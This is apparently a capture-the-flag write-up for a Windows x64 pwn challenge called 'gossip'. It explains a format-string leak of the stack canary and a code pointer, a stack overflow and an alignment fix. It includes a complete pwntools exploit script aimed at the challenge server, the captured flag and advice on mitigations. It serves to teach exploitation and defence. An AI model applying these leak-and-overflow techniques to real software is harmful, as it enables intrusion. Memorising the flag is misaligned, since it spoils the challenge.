# gossip

Category: Pwn   Solves: 20   Author: Hann   Flag: `nexsec26{328869a59fefd03c2d07280114bc0f65d25ffbcd1615c94a84b52799421efa5a}`   Tools I used: Python (pwntools), Ghidra + capstone for the disassembly, ROPgadget, and DeepSeek for analysis/guidance ([chat](https://chat.deepseek.com/share/sa48sim9w39aspngp8)).

![challenge card](./challenge.png)

> Gosip's little sibling rolled into town instead. it listens to *everything*: your name, your secrets, even your last words.
>
> **Note:** the service is a Windows PE (x64) served via Wine.
>
> `nc koala.nexsec.my <PORT>` — flag format `nexsec26{...}`

The challenge hands you a single Windows x64 binary, `gossips.exe`, behind `nc` and running under Wine. It reads a real `flag.txt` into memory and has a function that prints it — but that function is never called in the normal flow. The whole challenge is getting execution to redirect there, through a stack canary, DEP, and ASLR, armed with nothing but two chatty `printf`s and one oversized `read`.

## TL;DR

There's a `print_flag` function at `0x140001000` that opens `flag.txt`, does `printf("FLAG: %s", ...)` and `ExitProcess` — but it's dead code, never reached by `main`. So this is a ret2win, and `main` gives me everything I need:

1. **Format string.** `main` reads my "secret" into a buffer and then `printf(secret)` with no format string of its own — a classic `%p` leak. I use it to dump the stack and recover the **stack canary** and a **code pointer** (to defeat ASLR). Bonus: under Wine the main image doesn't actually slide, so the base stays `0x140000000`, but I compute the slide from the leak anyway so it's remote-safe.
2. **Stack overflow.** The "last words" prompt does a **512-byte** `ReadFile` into a buffer that sits only 272 bytes below the canary. I rebuild the stack — padding, the real canary (so `__security_check_cookie` passes), the saved quadwords, and the return address overwritten with `print_flag`.
3. **x64 alignment.** Jumping straight into `print_flag` crashes inside `fopen`/`printf` because the stack is misaligned by 8. A single `ret` gadget before the win address flips the alignment and the flag prints cleanly.

The one trap that cost me the most time wasn't a mitigation at all — it was an off-by-16 in the overflow offset, because there are **two** saved quadwords between the canary and the return address, not one.

## Step 1 — Recon: what's protected and what's reachable

PE-aware `checksec` says the mitigations are all on: **DEP/NX**, **ASLR** (high-entropy), and **stack canaries** (`__security_cookie`). No CFG. Imports are just `KERNEL32.dll` — `ReadFile`, `WriteFile`, `GetStdHandle`, `ExitProcess`, etc. No `system`, no `WinExec`. So I'm not spawning a shell; I'm redirecting to the built-in flag printer.

The interesting strings tell the story: `flag.txt`, `FLAG: %s`, and the three prompts ("who are you?", "tell me a secret", "last words before it all burns?").

Two functions matter:

- **`print_flag` @ `0x140001000`** — `fopen("flag.txt")`, `fread`, `printf("FLAG: %s", buf)`, then `ExitProcess`. **Never called** from `main`. This is the win function.
- **`main` @ `0x1400010f0`** — frame is `push rbx ; sub rsp,0x170`, canary at `rsp+0x160`. It does three raw reads:

  ```
  ReadFile(stdin, buf=[rsp+0x38], 0x17)   ; name   (23 bytes)   -> printf([rsp+0x38])   <-- fmt string
  ReadFile(stdin, buf=[rsp+0x90], 0xc8)   ; secret (200 bytes)  -> printf([rsp+0x90])   <-- fmt string
  ReadFile(stdin, buf=[rsp+0x50], 0x200)  ; last words (512!)   -> overflow
  ```

So I have two format-string primitives (name and secret) for leaking, and one fat overflow for control flow. The name buffer is only 23 bytes, so I do my leaking through the roomy 200-byte **secret** buffer.

## Step 2 — Leaking the canary and beating ASLR

`printf(secret)` with my input as the format string leaks the stack. I send a marker plus a chain of `%p|` and index into the parsed result:

```
MARK8080:%p|%p|%p|...   (×60, fits in the 200-byte secret buffer)
```

(Positional `%N$p` gave garbage here — this Wine CRT's `printf` doesn't seem to honour it — so the plain chain is the reliable way.)

The secret buffer is at `rsp+0x90`, and my marker `"MARK8080"` shows up at slot 17 of the dump. That anchors the whole map: each slot is 8 bytes, so

```
slot n  ->  rsp + 0x90 + (n - 17) * 8
```

Reading off the leak:

| slot | rsp offset | value | what |
|---|---|---|---|
| 43 | `rsp+0x160` | `0x00007b9d1b2e875d` (random each run) | **stack canary** |
| 44 | `rsp+0x168` | stack address | saved quadword |
| 45 | `rsp+0x170` | stack address | saved quadword |
| 46 | `rsp+0x178` | `0x00000001400015f0` | **code pointer** (return into `main`) |

Slot 43 lands exactly on the canary location and changes every run — that's the cookie. Slot 46 is a clean in-image code address (`0x1400015f0`, RVA `0x15f0`), which gives me the image base. Under Wine the main module loads at its preferred base `0x140000000` and doesn't randomise, so the slide is 0 — but I still compute it from the leak so the exploit survives a remote that *does* slide:

```python
slide = codeptr - 0x1400015f0      # static value of slot 46
win   = 0x140001000 + slide        # print_flag
```

## Step 3 — The overflow, and the two-buffer offset trap

The "last words" buffer is at `rsp+0x50`, a different buffer than the one I leaked through (`rsp+0x90`). The canary at `rsp+0x160` is therefore `0x160 - 0x50 = 0x110 = 272` bytes into my overflow. So far so good.

My first attempt put the return address 8 bytes after the canary:

```
A*272 + canary + B*8 + p64(win)
```

…and the program just printed "...it's all gone now." and **exited cleanly**. No crash, no flag. That clean exit was the clue: I wasn't overwriting the return address at all — the canary check passed (I preserved it), and `main` returned normally.

The leak explains why. The code pointer is at **slot 46 = `rsp+0x178`**, not slot 45 (`rsp+0x170`, which was a stack value). There are **two** saved quadwords between the canary and the saved return address, so the real offsets from the last-words buffer are:

```
rsp+0x160  canary        -> offset 0x110 = 272
rsp+0x168  saved qword    -> offset 0x118 = 280   (slot 44)
rsp+0x170  saved qword    -> offset 0x120 = 288   (slot 45)
rsp+0x178  return address -> offset 0x128 = 296   (slot 46)  <-- the real target
```

My payload had put `win` at offset 288 (slot 45), a saved stack value, leaving the actual return address untouched. Fixing the offset to 296 — and restoring slots 44/45 exactly rather than clobbering them with junk — made execution finally land in `print_flag`.

## Step 4 — The x64 stack-alignment fix

With the offset fixed it reached the win function… and crashed, this time with a big Wine exception dump instead of a clean exit. That's the textbook x64 alignment symptom.

The ABI rule: when a function begins executing, `rsp % 16 == 8` (because the `call` that entered it pushed 8 bytes). Compilers pick their `sub rsp, N` to keep every inner `call` aligned on that assumption. When I `ret` straight into `print_flag`, it enters with `rsp % 16 == 0` instead of `8`, so its internal `call fopen`/`call printf` land misaligned and a `movaps` inside the CRT faults — *before* the flag is ever flushed.

The fix is one extra `ret`. I put a bare `ret` gadget at the saved-return-address slot and the win address right after it:

```
... + p64(ret_gadget) + p64(win)
```

`main`'s `ret` pops the `ret` gadget → which pops `win` → entering `print_flag` with 8 fewer bytes on the stack, i.e. `rsp % 16 == 8`. Now `fopen`/`printf` run correctly and the flag prints. `ROPgadget --binary gossips.exe | grep ': ret$'` gives plenty; I used `0x1400010e7`.

(`print_flag` ends in `ExitProcess`, not a `ret`, so its own canary is never checked — I only had to satisfy `main`'s.)

## Step 5 — The exploit script

```python
from pwn import *
import re

context.arch = 'amd64'
HOST, PORT = 'koala.nexsec.my', 36281

STATIC_PTR_46 = 0x1400015f0   # static value of the leaked code ptr (slot 46)
WIN_STATIC    = 0x140001000   # print_flag
RET_GADGET    = 0x1400010e7   # a bare `ret`, for alignment

io = remote(HOST, PORT)

# 1) name: keep it plain (it's also printf'd)
io.recvuntil(b'who are you?')
io.sendline(b'anon')

# 2) secret: format-string leak
io.recvuntil(b'tell me a secret')
io.sendline(b'MARK8080:' + b'%p|' * 60)

io.recvuntil(b'MARK8080:')
leak = io.recvline()
vals = [int(v, 16) for v in re.findall(rb'(?:0x)?([0-9a-fA-F]{2,})', leak)]

canary  = vals[43]
slot44  = vals[44]
slot45  = vals[45]
codeptr = vals[46]

slide = codeptr - STATIC_PTR_46
win   = WIN_STATIC + slide
log.success('canary=%#x  base=%#x  win=%#x', canary, codeptr - 0x15f0, win)

# 3) overflow: pad -> canary -> two saved qwords -> ret(align) -> win
payload  = b'A' * (0x160 - 0x50)      # 272, up to the canary
payload += p64(canary)                # rsp+0x160
payload += p64(slot44)                # rsp+0x168 (preserve)
payload += p64(slot45)                # rsp+0x170 (preserve)
payload += p64(RET_GADGET + slide)    # rsp+0x178 saved RIP -> ret (align)
payload += p64(win)                   # rsp+0x180 -> print_flag

io.recvuntil(b'last words')
io.send(payload)

data = io.recvall(timeout=6)
flag = re.search(rb'nexsec26\{[^}]*\}', data)
log.success('FLAG: %s', flag.group().decode() if flag else '???')
```

Running it:

```
[gossips] ...it's all gone now.
FLAG: nexsec26{328869a59fefd03c2d07280114bc0f65d25ffbcd1615c94a84b52799421efa5a}
```

## The flag

```
nexsec26{328869a59fefd03c2d07280114bc0f65d25ffbcd1615c94a84b52799421efa5a}
```

## Mitigations

* **`printf` on attacker input.** Both the name and the secret are passed straight to `printf` as the format string — that's the entire leak primitive. Always `printf("%s", user_input)`; never `printf(user_input)`.
* **Oversized read into a small buffer.** The "last words" read takes `0x200` bytes into a buffer with only `0x110` before the canary. Bound every read to the destination size (and don't trust `ReadFile`'s count to be "whatever's convenient").
* **A reachable flag printer.** `print_flag` is dead code left in the binary, so a single return-address overwrite is enough — there's no need to build a full ROP chain or defeat DEP. Don't ship win functions in release binaries; they turn a leak + overflow into an instant ret2win.
* **Leakable canary.** The canary only helps if it can't be read. A format-string leak hands it over, after which the overflow just replays it. The format string is the real root cause here — fix that and the canary does its job.

## The exploit chain, at a glance

```
printf(secret) format-string leak  ->  stack canary (slot 43) + code ptr (slot 46)
   -> code ptr defeats ASLR (Wine base = 0x140000000, slide 0, computed anyway)
   -> 512-byte "last words" overflow into buf @ rsp+0x50
   -> rebuild stack: 272 pad + canary + 2 saved qwords + ret-gadget + print_flag
         (return address is at offset 296, not 288 — two saved qwords, not one)
   -> single `ret` fixes x64 16-byte alignment so print_flag's fopen/printf don't fault
   -> print_flag reads flag.txt and prints FLAG: ... before ExitProcess
```
